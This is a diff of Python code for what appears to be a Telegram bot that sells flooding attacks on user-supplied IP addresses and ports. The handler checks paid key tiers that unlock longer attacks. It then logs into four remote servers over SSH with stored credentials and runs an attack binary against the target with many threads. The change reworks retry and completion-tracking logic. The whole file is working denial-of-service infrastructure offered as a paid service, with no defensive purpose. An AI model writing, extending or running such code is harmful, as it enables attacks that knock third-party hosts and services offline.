@@ -2119,193 +2119,142 @@ ATTACK_HISTORY = {}  # Key: (ip, port), Value: attack count
 
 
 async def attack_input(update: Update, context: CallbackContext):
-    global last_attack_time, running_attacks
+    global last_attack_time, running_attacks, VPS_LIST
 
     args = update.message.text.split()
-    if len(args) != 3:  # Now only 3 arguments (ip, port, duration)
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    if len(args) != 3:  # Require: <IP> <PORT> <DURATION>
         await update.message.reply_text(
-            f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
-            f"👑 *Bot Owner:* {current_display_name}\n"
-            f"💬 *Need a key for 200s? DM:* {current_display_name}",
+            "❌ *Invalid format!* Use: `<ip> <port> <duration>`",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-    ip, port, duration = args  # Only 3 variables
+    ip, port, duration = args
     duration = int(duration)
-    
-    # Check busy VPS and available VPS
-    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
-    available_vps = [vps for vps in VPS_LIST[:ACTIVE_VPS_COUNT] if vps[0] not in busy_vps]
-    
-    # We can now use whatever VPS are available (minimum 1)
-    if len(available_vps) == 0:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        await update.message.reply_text(
-            "❌ *No servers available! Try again later.*\n\n"
-            f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-
-    # Use all available VPS (1-4)
-    selected_vps = available_vps[:4]  # Still maximum 4 VPS
-    
-    # Set default threads
     user_id = update.effective_user.id
-    is_special = False
-    threads = MAX_THREADS  # Default threads for normal users
-    
-    if user_id in redeemed_users:
-        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
-            is_special = True
-            threads = SPECIAL_MAX_THREADS  # Default threads for special key users
-    
-    if duration > max_duration and not is_special:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        await update.message.reply_text(
-            f"❌ *Attack duration exceeds 120 seconds!*\n"
-            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
-            f"👑 *Buy keys from:* {current_display_name}",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
+    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
 
+    # Tier-based limits
+    is_special = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special')
+    threads = SPECIAL_MAX_THREADS if is_special else MAX_THREADS
     max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
 
     if duration > max_allowed_duration:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
         await update.message.reply_text(
-            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
-            f"👑 *Bot Owner:* {current_display_name}",
+            f"❌ *Max duration exceeded!* ({max_allowed_duration}s allowed)\n"
+            f"🔑 Special keys unlock longer attacks.",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
+    # Check server availability (retry loop)
+    max_retries = 3
+    retry_delay = 10  # seconds
+    selected_vps = []
+
+    for attempt in range(max_retries):
+        busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
+        available_vps = [vps for vps in VPS_LIST if vps[0] not in busy_vps]
+
+        if len(available_vps) >= 4:
+            selected_vps = available_vps[:4]
+            break
+        elif attempt < max_retries - 1:
+            await update.message.reply_text(
+                f"⚠️ *All servers busy!* (Retry {attempt + 1}/{max_retries})\n"
+                f"Waiting for free servers...",
+                parse_mode='Markdown'
+            )
+            await asyncio.sleep(retry_delay)
+        else:
+            await update.message.reply_text(
+                "❌ *All servers are busy!*\n"
+                "Please try again later or ask the admin to add more servers.\n\n"
+                f"👑 Owner: {current_display_name}",
+                parse_mode='Markdown'
+            )
+            return ConversationHandler.END
+
+    # Proceed if 4 servers are free
     last_attack_time = time.time()
-    
-    # Calculate threads per VPS based on available VPS count
-    vps_count = len(selected_vps)
-    threads_per_vps = threads // vps_count
-    remaining_threads = threads % vps_count
-    
     attack_id = f"{ip}:{port}-{time.time()}"
-    
-    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-    
-    # Send attack started message with actual VPS count being used
-    start_message = await update.message.reply_text(
-        f"{attack_type}\n"
-        f"🎯 *Target*: {ip}:{port}\n"
-        f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Total Power*: {threads} threads\n"
-        f"🖥️ *Using*: {vps_count} Squid Proxy Server{'s' if vps_count > 1 else ''}\n"
-        f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *ATTACK STARTED! /running * 💥",
+
+    # Attack started message
+    await update.message.reply_text(
+        f"⚡ *{'SPECIAL ' if is_special else ''}ATTACK LAUNCHED!* ⚡\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"⏱️ Duration: `{duration}s`\n"
+        f"🧵 Threads per VPS: `{threads}`\n"
+        f"🖥️ Using: `4` Servers\n\n"
+        f"🔥 *Status:* /running\n"
+        f"👑 Owner: {current_display_name}",
         parse_mode='Markdown'
     )
 
-    def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
-        """Synchronous SSH attack function to be run in thread"""
+    # Track completion
+    completed_vps = 0
+    completion_lock = threading.Lock()
+
+    def _run_ssh_attack(vps, attack_num):
+        nonlocal completed_vps
         ip_vps, username, password = vps
         attack_id_vps = f"{attack_id}-{attack_num}"
-        
-        # Register this attack
+
+        # Register attack
         running_attacks[attack_id_vps] = {
             'user_id': user_id,
             'target_ip': ip,
             'start_time': time.time(),
             'duration': duration,
-            'is_special': is_special,
             'vps_ip': ip_vps
         }
-        
+
         ssh = None
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(ip_vps, username=username, password=password, timeout=10)
-            
-            # Set keepalive to prevent connection drops
             transport = ssh.get_transport()
             transport.set_keepalive(30)
-            
-            command = f"{BINARY_PATH} {ip} {port} {duration} {threads_for_vps}"
-            stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
-            
-            # Wait for command to complete or timeout
-            start_time = time.time()
-            while time.time() - start_time < duration + 10:
-                if stdout.channel.exit_status_ready():
-                    break
-                time.sleep(1)
-            
-            logging.info(f"Attack finished on VPS {ip_vps}")
-            
+
+            command = f"{BINARY_PATH} {ip} {port} {duration} {threads}"
+            ssh.exec_command(command, timeout=duration + 10)
+            time.sleep(duration)  # Simulate attack duration
+
         except Exception as e:
-            logging.error(f"SSH error on {ip_vps}: {str(e)}")
+            logging.error(f"VPS {ip_vps} failed: {str(e)}")
         finally:
             if ssh:
-                try:
-                    ssh.close()
-                except:
-                    pass
-            
-            # Remove from running attacks when done
-            if attack_id_vps in running_attacks:
-                del running_attacks[attack_id_vps]
-            
-            # Check if all attacks for this target are done
-            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
-            if not active_attacks:
-                # All attacks finished for this target
-                # Add 5-second countdown before sending finished notification
-                def send_finished_notification():
-                    # Sleep for 5 seconds before sending notification
-                    time.sleep(5)
+                ssh.close()
+
+            # Mark completion
+            with completion_lock:
+                completed_vps += 1
+                if completed_vps == 4:
                     asyncio.run_coroutine_threadsafe(
                         context.bot.send_message(
                             chat_id=update.effective_chat.id,
-                            text=f"✅ *Attack Finished!*\n"
-                                 f"🎯 *Target*: {ip}:{port}\n"
-                                 f"🕒 *Duration*: {duration} sec\n"
-                                 f"🧵 *Total Power*: {threads} threads\n"
-                                 f"🖥️ *Used*: {vps_count} Server{'s' if vps_count > 1 else ''}\n"
-                                 f"👑 *Bot Owner:* {current_display_name}\n\n"
-                                 f"🔥 *ATTACK COMPLETED!*",
+                            text=f"✅ *ATTACK FINISHED!*\n"
+                                 f"🎯 Target: `{ip}:{port}`\n"
+                                 f"⏱️ Duration: `{duration}s`\n"
+                                 f"👑 Owner: {current_display_name}",
                             parse_mode='Markdown'
                         ),
                         context.bot.application.event_loop
                     )
-                
-                # Start the countdown in a separate thread
-                threading.Thread(
-                    target=send_finished_notification,
-                    daemon=True
-                ).start()
 
-    try:
-        # Start a thread for each selected VPS (1-4 VPS)
-        for i, vps in enumerate(selected_vps):
-            threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
-            if threads_for_vps > 0:
-                threading.Thread(
-                    target=_run_ssh_attack,
-                    args=(vps, threads_for_vps, i, context),
-                    daemon=True
-                ).start()
-        
-    except Exception as e:
-        logging.error(f"Error starting attack threads: {str(e)}")
-        await update.message.reply_text(
-            f"❌ *Error starting attack!*\n"
-            f"Error: {str(e)}\n\n"
-            f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
-        )
-    
+            # Cleanup
+            if attack_id_vps in running_attacks:
+                del running_attacks[attack_id_vps]
+
+    # Launch attacks
+    for i, vps in enumerate(selected_vps):
+        threading.Thread(
+            target=_run_ssh_attack,
+            args=(vps, i),
+            daemon=True
+        ).start()
+
     return ConversationHandler.END
 
 async def check_vps_health(vps):
